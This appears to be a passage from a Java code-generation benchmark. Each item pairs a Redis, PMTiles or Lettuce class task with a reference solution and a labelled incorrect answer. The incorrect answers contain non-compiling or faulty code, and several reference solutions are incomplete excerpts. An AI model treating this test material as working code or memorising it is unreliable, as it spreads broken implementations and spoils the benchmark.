    "Instruction": "Task Description: Create a Java class that implements Redis cluster operations using JedisCluster for caching management, including basic CRUD operations, hash operations, and batch operations.\n\nClass Description: JedisClusterCacheManager is a Redis cache manager implementation that uses JedisCluster to interact with a Redis cluster. It provides various Redis operations including setting/getting values, hash operations, batch operations, and deletion. The class handles serialization/deserialization of objects and manages Redis connections.\n\nAttributes:\n- redis: JedisClusterClient - The Redis client wrapper that implements IRedis interface\n- log: Logger - Logger instance for error logging\n- serializer: ISerializer<Object> - Serializer for converting objects to/from byte arrays (inherited from AbstractRedisCacheManager)\n\nMethods:\n- JedisClusterCacheManager(JedisCluster, ISerializer<Object>) -> void - Constructor that initializes the Redis client and serializer\n- getRedis() -> IRedis - Returns the Redis client instance\n- close() -> void - Closes the Redis connection (inherited from AbstractRedisCacheManager)\n- set(byte[], byte[]) -> void - Sets a key-value pair in Redis\n- setex(byte[], int, byte[]) -> void - Sets a key-value pair with expiration time\n- hset(byte[], byte[], byte[]) -> void - Sets a field in a Redis hash\n- hset(byte[], byte[], byte[], int) -> void - Sets a field in a Redis hash with expiration time for the key\n- mset(Collection<MSetParam>) -> void - Batch sets multiple key-value pairs\n- get(byte[]) -> byte[] - Gets a value by key\n- hget(byte[], byte[]) -> byte[] - Gets a field value from a Redis hash\n- mget(Type, Set<CacheKeyTO>) -> Map<CacheKeyTO, CacheWrapper<Object>> - Batch gets multiple values\n- delete(Set<CacheKeyTO>) -> void - Deletes multiple keys",
    "Canonical_solution": "import com.jarvis.cache.MSetParam;\nimport com.jarvis.cache.serializer.ISerializer;\nimport com.jarvis.cache.to.CacheKeyTO;\nimport com.jarvis.cache.to.CacheWrapper;\nimport redis.clients.jedis.JedisCluster;\nimport java.io.IOException;\nimport java.lang.reflect.Type;\nimport java.util.Collection;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class JedisClusterCacheManager extends AbstractRedisCacheManager {\n\n    private static final Logger log = LoggerFactory.getLogger(JedisClusterCacheManager.class);\n    \n    private final JedisClusterClient redis;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        super(serializer);\n        this.redis = new JedisClusterClient(jedisCluster, this);\n    }\n\n    @Override\n    protected IRedis getRedis() {\n        return redis;\n    }\n\n    public static class JedisClusterClient implements IRedis {\n\n        private final JedisCluster jedisCluster;\n        private final AbstractRedisCacheManager cacheManager;\n\n        public JedisClusterClient(JedisCluster jedisCluster, AbstractRedisCacheManager cacheManager) {\n            this.jedisCluster = jedisCluster;\n            this.cacheManager = cacheManager;\n        }\n\n        @Override\n        public void close() throws IOException {\n        }\n\n        @Override\n        public void set(byte[] key, byte[] value) {\n            jedisCluster.set(key, value);\n        }\n\n        @Override\n        public void setex(byte[] key, int seconds, byte[] value) {\n            jedisCluster.setex(key, seconds, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value) {\n            jedisCluster.hset(key, field, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    pipeline.hset(key, field, value);\n                    pipeline.expire(key, seconds);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public void mset(Collection<MSetParam> params) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) throws Exception {\n                    JedisUtil.executeMSet(pipeline, cacheManager, params);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public byte[] get(byte[] key) {\n            return jedisCluster.get(key);\n        }\n\n        @Override\n        public byte[] hget(byte[] key, byte[] field) {\n            return jedisCluster.hget(key, field);\n        }\n\n        @Override\n        public Map<CacheKeyTO, CacheWrapper<Object>> mget(Type returnType, Set<CacheKeyTO> keys) throws Exception {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeMGet(pipeline, keys);\n                }\n            };\n            return cacheManager.deserialize(keys, retryableJedisClusterPipeline.syncAndReturnAll(), returnType);\n        }\n\n        @Override\n        public void delete(Set<CacheKeyTO> keys) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeDelete(pipeline, keys);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport org.apache.logging.log4j.Logger;\nimport redis.clients.jedis.JedisCluster;\nimport java.util.*;\n\npublic class JedisClusterCacheManager {\n    private JedisCluster redis;\n    private Logger log;\n    private ISerializer<Object> serializer;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        this.redis = jedisCluster;\n        this.serializer = serializer;\n        this.log = org.apache.logging.log4j.LogManager.getLogger(JedisClusterCacheManager.class);\n    }\n\n    public IRedis getRedis() {\n        return redis;\n    }\n\n    public void close() {\n        if (redis != null) {\n            redis.close();\n        }\n    }\n\n    public void set(byte[] key, byte[] value) {\n        try {\n            redis.set(key, value);\n        } catch (Exception e) {\n            log.error(\"Error setting key: \" + Arrays.toString(key), e);\n        }\n    }\n\n    public void setex(byte[] key, int seconds, byte[] value) {\n        try {\n            redis.setex(key, seconds, value);\n        } catch (Exception e) {\n            log.error(\"Error setting key with expiration: \" + Arrays.toString(key), e);\n        }\n    }\n\n    public void hset(byte[] key, byte[] field, byte[] value) {\n        try {\n            redis.hset(key, field, value);\n        } catch (Exception e) {\n            log.error(\"Error setting hash field: \" + Arrays.toString(key) + \" \" + Arrays.toString(field), e);\n        }\n    }\n\n    public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n        try {\n            redis.hset(key, field, value, seconds);\n        } catch (Exception e) {\n            log.error(\"Error setting hash field with expiration: \" + Arrays.toString(key) + \" \" + Arrays.toString(field), e);\n        }\n    }\n\n    public void mset(Collection<MSetParam> params) {\n        for (MSetParam param : params) {\n            set(param.getKey(), param.getValue());\n        }\n    }\n\n    public byte[] get(byte[] key) {\n        try {\n            return redis.get(key);\n        } catch (Exception e) {\n            log.error(\"Error getting key: \" + Arrays.toString(key), e);\n            return null;\n        }\n    }\n\n    public byte[] hget(byte[] key, byte[] field) {\n        try {\n            return redis.hget(key, field);\n        } catch (Exception e) {\n            log.error(\"Error getting hash field: \" + Arrays.toString(key) + \" \" + Arrays.toString(field), e);\n            return null;\n        }\n    }\n\n    public Map<CacheKeyTO, CacheWrapper<Object>> mget(Type type, Set<CacheKeyTO> keys) {\n        Map<CacheKeyTO, byte[]> results = new HashMap<>();\n        for (CacheKeyTO key : keys) {\n            byte[] value = get(key.getKey());\n            results.put(key, value);\n        }\n        Map<CacheKeyTO, CacheWrapper<Object>> wrappedResults = new HashMap<>();\n        for (Map.Entry<CacheKeyTO, byte[]> entry : results.entrySet()) {\n            CacheWrapper<Object> wrapper = new CacheWrapper<>(serializer.deserialize(entry.getValue()));\n            wrappedResults.put(entry.getKey(), wrapper);\n        }\n        return wrappedResults;\n    }\n\n    public void delete(Set<CacheKeyTO> keys) {\n        for (CacheKeyTO key : keys) {\n            redis.del(key.getKey());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Java class that implements a writable tile archive using Java NIO's FileChannel for efficient file operations, supporting both file-based and in-memory storage options.\n\nClass Description: WriteablePmtiles is a class that provides functionality to write and manage tile archive data using Java NIO channels. It supports writing to either a physical file or an in-memory buffer, tracks bytes written, and handles proper resource cleanup.\n\nAttributes:\n- out: [SeekableByteChannel] - The channel used for writing data (either FileChannel or in-memory channel)\n- bytesWritten: [LongSupplier] - A supplier that provides the number of bytes written to the channel\n\nMethods:\n- newWriteToFile(Path path) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to a physical file at the specified path\n- newWriteToMemory(SeekableInMemoryByteChannel bytes) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to an in-memory byte channel\n- finish(TileArchiveMetadata tileArchiveMetadata) -> [void] - Finalizes the archive by writing metadata and directory information\n- bytesWritten() -> [long] - Returns the number of bytes written to the archive\n- close() -> [void] - Closes the underlying channel and releases system resources\n- DeduplicatingTileWriter.write(TileEncodingResult encodingResult) -> [void] - Inner class method that writes tile data to the channel\n- DeduplicatingTileWriter.close() -> [void] - Inner class method that performs any necessary cleanup (none in this implementation)",
    "Canonical_solution": "import com.onthegomap.planetiler.util.FileUtils;\nimport com.onthegomap.planetiler.util.SeekableInMemoryByteChannel;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.function.LongSupplier;\n\npublic final class WriteablePmtiles implements WriteableTileArchive {\n\n  private final SeekableByteChannel out;\n  private final LongSupplier bytesWritten;\n\n  private WriteablePmtiles(SeekableByteChannel channel, LongSupplier bytesWritten) throws IOException {\n    this.out = channel;\n    out.write(ByteBuffer.allocate(INIT_SECTION));\n    this.bytesWritten = bytesWritten;\n  }\n\n  public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n    return new WriteablePmtiles(\n      FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE),\n      () -> FileUtils.size(path)\n    );\n  }\n\n  public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) throws IOException {\n    return new WriteablePmtiles(bytes, () -> 0);\n  }\n\n  @Override\n  public void finish(TileArchiveMetadata tileArchiveMetadata) {\n    try {\n      out.write(ByteBuffer.wrap(jsonBytes));\n      out.write(ByteBuffer.wrap(directories.leaves));\n      out.position(0);\n      out.write(ByteBuffer.wrap(header.toBytes()));\n      out.write(ByteBuffer.wrap(directories.root));\n    } catch (IOException e) {\n      LOGGER.error(e.getMessage());\n    }\n  }\n\n  @Override\n  public long bytesWritten() {\n    return bytesWritten.getAsLong();\n  }\n\n  @Override\n  public void close() throws IOException {\n    out.close();\n  }\n\n  private class DeduplicatingTileWriter implements TileWriter {\n    @Override\n    public void write(TileEncodingResult encodingResult) {\n      try {\n        out.write(ByteBuffer.wrap(data));\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n      currentOffset += data.length;\n    }\n\n    @Override\n    public void close() {\n      // no cleanup needed.\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class WriteablePmtiles {\n    private final SeekableByteChannel out;\n    private final LongSupplier bytesWritten;\n    private long bytesWrittenCount;\n\n    public WriteablePmtiles(SeekableByteChannel out, LongSupplier bytesWritten) {\n        this.out = out;\n        this.bytesWritten = bytesWritten;\n        this.bytesWrittenCount = 0;\n    }\n\n    public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n        FileChannel fileChannel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        return new WriteablePmtiles(fileChannel, () -> bytesWrittenCount);\n    }\n\n    public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) {\n        return new WriteablePmtiles(bytes, () -> bytesWrittenCount);\n    }\n\n    public void finish(TileArchiveMetadata tileArchiveMetadata) {\n        out.write(ByteBuffer.wrap(\"PMTILES_METADATA\".getBytes()));\n    }\n\n    public long bytesWritten() {\n        return bytesWritten.getAsLong();\n    }\n\n    public void close() throws IOException {\n        out.close();\n    }\n\n    public class DeduplicatingTileWriter {\n        public void write(TileEncodingResult encodingResult) {\n            ByteBuffer buffer = encodingResult.getByteBuffer();\n            int bytesWritten = out.write(buffer);\n            bytesWrittenCount += bytesWritten;\n        }\n\n        public void close() {\n        }\n    }\n}"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Implement a distributed lock mechanism using Redis in Java to ensure thread-safe operations across multiple processes or systems.\n\nClass Description: RedisDistributeLock is a class that provides distributed locking functionality using Redis as the backend storage. It manages lock acquisition, release, and timeout handling to coordinate access to shared resources in a distributed environment.\n\nAttributes:\n- pool: [JedisPool] - The connection pool for Redis connections\n- jedisLock: [JedisLock] - The lock implementation instance\n- lockKey: [String] - The key used for locking in Redis\n- jedis: [Jedis] - The Redis client instance\n- timeoutMsecs: [int] - Maximum time to wait for lock acquisition in milliseconds\n- expireMsecs: [int] - Time after which the lock automatically expires in milliseconds\n\nMethods:\n- RedisDistributeLock([String] lockKey) -> [void] - Constructor with default timeout (3000ms) and expire (300000ms) values\n- RedisDistributeLock([String] lockKey, [int] timeoutMsecs, [int] expireMsecs) -> [void] - Constructor with custom timeout and expire values\n- wrap([Runnable] runnable) -> [void] - Executes the given runnable within the acquired lock context\n- lockRelease([JedisLock] lock, [Jedis] jedis) -> [void] - Releases the lock and closes the Redis connection\n- getPool() -> [JedisPool] - Static getter for the Redis connection pool\n- setPool([JedisPool] pool) -> [void] - Static setter for the Redis connection pool",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\npublic class RedisDistributeLock {\n\n    private static Logger LOGGER = LoggerFactory.getLogger(RedisDistributeLock.class);\n\n    private static JedisPool pool;\n    private JedisLock jedisLock;\n    private String lockKey;\n    private Jedis jedis;\n    private int timeoutMsecs;\n    private int expireMsecs;\n\n    public RedisDistributeLock(String lockKey) {\n        this(lockKey, 3000, 300000);\n    }\n\n    public RedisDistributeLock(String lockKey, int timeoutMsecs, int expireMsecs) {\n        this.lockKey = lockKey;\n        this.jedis = pool.getResource();\n        this.timeoutMsecs = timeoutMsecs;\n        this.expireMsecs = expireMsecs;\n        this.jedisLock = new JedisLock(jedis, lockKey.intern(), timeoutMsecs, expireMsecs);\n    }\n\n    public void wrap(Runnable runnable) {\n        long begin = System.currentTimeMillis();\n        try {\n            LOGGER.info(\"begin logck,lockKey={},timeoutMsecs={},expireMsecs={}\", lockKey, timeoutMsecs, expireMsecs);\n            if (jedisLock.acquire()) {\n                runnable.run();\n            } else {\n                LOGGER.info(\"The time wait for lock more than [{}] ms \", timeoutMsecs);\n            }\n        } catch (Throwable t) {\n            LOGGER.warn(t.getMessage(), t);\n        } finally {\n            this.lockRelease(jedisLock, jedis);\n        }\n        LOGGER.info(\"[{}]cost={}\", lockKey, System.currentTimeMillis() - begin);\n    }\n\n    private void lockRelease(JedisLock lock, Jedis jedis) {\n        if (lock != null) {\n            try {\n                lock.release();\n            } catch (Exception e) {\n            }\n        }\n        if (jedis != null) {\n            jedis.close();\n        }\n        LOGGER.info(\"release logck,lockKey={},timeoutMsecs={},expireMsecs={}\", lockKey, timeoutMsecs, expireMsecs);\n    }\n\n    public static JedisPool getPool() {\n        return pool;\n    }\n\n    public static synchronized void setPool(JedisPool pool) {\n        RedisDistributeLock.pool = pool;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport java.util.UUID;\n\npublic class RedisDistributeLock {\n    private static JedisPool pool;\n    private Jedis jedis;\n    private String lockKey;\n    private int timeoutMsecs;\n    private int expireMsecs;\n    private String currentUUID;\n\n    public RedisDistributeLock(String lockKey) {\n        this(lockKey, 3000, 300000);\n    }\n\n    public RedisDistributeLock(String lockKey, int timeoutMsecs, int expireMsecs) {\n        this.lockKey = lockKey;\n        this.timeoutMsecs = timeoutMsecs;\n        this.expireMsecs = expireMsecs;\n        this.jedis = pool.getResource();\n    }\n\n    public void wrap(Runnable runnable) {\n        if (acquireLock()) {\n            try {\n                runnable.run();\n            } finally {\n                releaseLock();\n            }\n        }\n    }\n\n    private boolean acquireLock() {\n        String uuid = UUID.randomUUID().toString();\n        long startTime = System.currentTimeMillis();\n        while (System.currentTimeMillis() - startTime < timeoutMsecs) {\n            Boolean result = jedis.set(lockKey, uuid, \"NX\", \"PX\", expireMsecs);\n            if (result != null && result) {\n                currentUUID = uuid;\n                return true;\n            }\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                return false;\n            }\n        }\n        return false;\n    }\n\n    private void releaseLock() {\n        String storedValue = jedis.get(lockKey);\n        if (storedValue != null && storedValue.equals(currentUUID)) {\n            jedis.del(lockKey);\n        }\n    }\n\n    public static JedisPool getPool() {\n        return pool;\n    }\n\n    public static void setPool(JedisPool pool) {\n        RedisDistributeLock.pool = pool;\n    }\n\n    public void lockRelease(JedisLock lock, Jedis jedis) {\n        String storedValue = jedis.get(lockKey);\n        if (storedValue != null && storedValue.equals(currentUUID)) {\n            jedis.del(lockKey);\n            jedis.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 353,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Lettuce client, supporting batch operations with asynchronous command execution.\n\nClass Description: The RedisConnectionManager class provides a way to establish, manage, and close Redis connections using Lettuce client. It supports binary data operations through ByteArrayCodec and maintains a batch of asynchronous commands for execution.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte arrays as key/value format\n- BATCH_SIZE: int (static final) - Constant defining the maximum number of commands in a batch\n- commands: CompletableFuture[] - Array to store asynchronous command futures for batch operations\n\nMethods:\n- setupConnection(): void - Initializes the Redis client and establishes a connection using test settings (host and port from TestSettings)\n- getConnection(): StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection\n- closeConnection(): void - Properly closes the Redis connection and shuts down the client\n- getCommandFutures(): CompletableFuture[] - Returns the array of command futures for batch operations\n- getBatchSize(): int - Returns the constant batch size value",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n    private static final int BATCH_SIZE = 20;\n    private CompletableFuture[] commands;\n\n    public void setupConnection() {\n        redisClient = RedisClient.create(RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n        commands = new CompletableFuture[BATCH_SIZE];\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public CompletableFuture[] getCommandFutures() {\n        return commands;\n    }\n\n    public int getBatchSize() {\n        return BATCH_SIZE;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n    private static final int BATCH_SIZE = 100;\n    private CompletableFuture<?>[] commands;\n\n    public void setupConnection() {\n        redisClient = RedisClient.create(TestSettings.getConfiguration());\n        connection = redisClient.connect();\n        connection.setCodec(new ByteArrayCodec());\n        commands = new CompletableFuture[BATCH_SIZE];\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public CompletableFuture<?>[] getCommandFutures() {\n        return commands;\n    }\n\n    public int getBatchSize() {\n        return BATCH_SIZE;\n    }\n}"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Implement a Redis-based broadcast service for inter-process communication that allows sending and receiving messages between different instances of an application.\n\nClass Description: RedisBroadcastService is a class that provides publish-subscribe functionality using Redis as the message broker. It handles message serialization/deserialization and ensures messages are only processed by other instances (not the sender).\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization of messages\n- executorService: ExecutorService - Handles message reception in a separate thread\n- channel: String - The Redis channel name for pub/sub communication\n- subscriber: Jedis - Redis client for subscribing to messages\n- publisher: Jedis - Redis client for publishing messages\n- id: String - Unique identifier for this service instance to avoid processing own messages\n\nMethods:\n- RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) -> void - Constructor that initializes Redis connections\n- sendMessage(BroadcastMessage message) -> void - Publishes a message to the Redis channel\n- start() -> void - Starts the message receiver in a separate thread\n- stop() -> void - Closes Redis connections and cleans up resources\n- receiver: Runnable - Internal thread that handles incoming messages from Redis",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport java.io.IOException;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\n\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisBroadcastService extends BaseBroadcastService {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisBroadcastService.class);\n\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel = \"traccar\";\n    private Jedis subscriber;\n    private Jedis publisher;\n    private final String id = UUID.randomUUID().toString();\n\n    public RedisBroadcastService(\n            Config config, ExecutorService executorService, ObjectMapper objectMapper) throws IOException {\n        this.executorService = executorService;\n        this.objectMapper = objectMapper;\n        String url = config.getString(Keys.BROADCAST_ADDRESS);\n\n        try {\n            subscriber = new Jedis(url);\n            publisher = new Jedis(url);\n            subscriber.connect();\n        } catch (JedisConnectionException e) {\n            throw new IOException(e);\n        }\n    }\n\n    @Override\n    protected void sendMessage(BroadcastMessage message) {\n        try {\n            String payload = id  + \":\" + objectMapper.writeValueAsString(message);\n            publisher.publish(channel, payload);\n        } catch (IOException | JedisConnectionException e) {\n            LOGGER.warn(\"Broadcast failed\", e);\n        }\n    }\n\n    @Override\n    public void start() throws IOException {\n        executorService.submit(receiver);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            if (subscriber != null) {\n                subscriber.close();\n                subscriber = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Subscriber close failed\", e);\n        }\n        try {\n            if (publisher != null) {\n                publisher.close();\n                publisher = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Publisher close failed\", e);\n        }\n    }\n\n    private final Runnable receiver = new Runnable() {\n        @Override\n        public void run() {\n            try {\n                subscriber.subscribe(new JedisPubSub() {\n                    @Override\n                    public void onMessage(String messageChannel, String message) {\n                        try {\n                            String[] parts = message.split(\":\", 2);\n                            if (messageChannel.equals(channel) && parts.length == 2 && !id.equals(parts[0])) {\n                                handleMessage(objectMapper.readValue(parts[1], BroadcastMessage.class));\n                            }\n                        } catch (Exception e) {\n                            LOGGER.warn(\"Broadcast handleMessage failed\", e);\n                        }\n                    }\n                }, channel);\n            } catch (JedisException e) {\n                throw new RuntimeException(e);\n            }\n        }\n    };\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisBroadcastService {\n    private Config config;\n    private ExecutorService executorService;\n    private ObjectMapper objectMapper;\n    private String channel;\n    private Jedis subscriber;\n    private Jedis publisher;\n    private String id;\n\n    public RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) {\n        this.config = config;\n        this.executorService = executorService;\n        this.objectMapper = objectMapper;\n        this.channel = config.getChannel();\n        this.id = config.getId();\n        this.subscriber = new Jedis(config.getHost(), config.getPort());\n        this.publisher = new Jedis(config.getHost(), config.getPort());\n    }\n\n    public void sendMessage(BroadcastMessage message) {\n        String json = null;\n        try {\n            json = objectMapper.writeValueAsString(message);\n        } catch (JsonProcessingException e) {\n            e.printStackTrace();\n        }\n        publisher.publish(channel, json);\n    }\n\n    public void start() {\n        executorService.submit(receiver);\n    }\n\n    public void stop() {\n        subscriber.disconnect();\n        publisher.disconnect();\n    }\n\n    private Runnable receiver = () -> {\n        subscriber.connect();\n        subscriber.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n                try {\n                    BroadcastMessage msg = objectMapper.readValue(message, BroadcastMessage.class);\n                    if (!msg.getId().equals(id)) {\n                        // Process the message here\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }, channel);\n    };\n}"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with authentication support, including connection initialization, creation of different connection types, and proper resource cleanup.\n\nClass Description: The RedisConnectionManager class provides centralized management for Redis connections, supporting both standalone and cluster configurations with token-based authentication. It handles connection lifecycle management and provides methods to create different types of Redis connections.\n\nAttributes:\n\nclientOptions: [ClusterClientOptions] - Configuration options for Redis client connections\ncredentialsProvider: [TokenBasedRedisCredentialsProvider] - Provider for token-based authentication credentials\nclient: [RedisClient] - Client instance for standalone Redis connections\nclusterClient: [RedisClusterClient] - Client instance for Redis cluster connections\n\nMethods:\n\ninitializeConnection: [Name]([EntraIdTestContext testCtx]) -> [void] - Initializes Redis client instances with connection options and authentication configuration\ncreateStandaloneConnection: [Name]() -> [StatefulRedisConnection<String, String>] - Creates and returns a new standalone Redis connection\ncreateClusterConnection: [Name]() -> [StatefulRedisClusterConnection<String, String>] - Creates and returns a new Redis cluster connection\ncreatePubSubConnection: [Name]() -> [StatefulRedisPubSubConnection<String, String>] - Creates and returns a new Redis Pub/Sub connection\ncloseConnections: [Name]() -> [void] - Closes all active connections and releases resources",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.authentication.core.TokenBasedRedisCredentialsProvider;\n\npublic class RedisConnectionManager {\n\n    private ClusterClientOptions clientOptions;\n    private TokenBasedRedisCredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        clientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(1)).build())\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        TokenAuthConfig tokenAuthConfig = EntraIDTokenAuthConfigBuilder.builder().clientId(testCtx.getClientId())\n                .secret(testCtx.getClientSecret()).authority(testCtx.getAuthority()).scopes(testCtx.getRedisScopes())\n                .expirationRefreshRatio(0.0000001F).build();\n\n        credentialsProvider = TokenBasedRedisCredentialsProvider.create(tokenAuthConfig);\n\n        RedisURI uri = RedisURI.builder().withHost(testCtx.host()).withPort(testCtx.port())\n                .withAuthentication(credentialsProvider).build();\n\n        client = RedisClient.create(uri);\n        client.setOptions(clientOptions);\n\n        RedisURI clusterUri = RedisURI.builder().withHost(testCtx.clusterHost().get(0)).withPort(testCtx.clusterPort())\n                .withAuthentication(credentialsProvider).build();\n        clusterClient = RedisClusterClient.create(clusterUri);\n        clusterClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub();\n    }\n\n    public void closeConnections() {\n        if (credentialsProvider != null) {\n            credentialsProvider.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n        if (clusterClient != null) {\n            clusterClient.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private ClusterClientOptions clientOptions;\n    private TokenBasedRedisCredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        this.clientOptions = testCtx.getClusterClientOptions();\n        this.credentialsProvider = testCtx.getCredentialsProvider();\n        this.client = RedisClient.create(clientOptions);\n        this.clusterClient = RedisClusterClient.create(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub();\n    }\n\n    public void closeConnections() {\n        if (client != null) client.close();\n        if (clusterClient != null) clusterClient.close();\n    }\n}"
  },
  {
    "Task_id": 359,
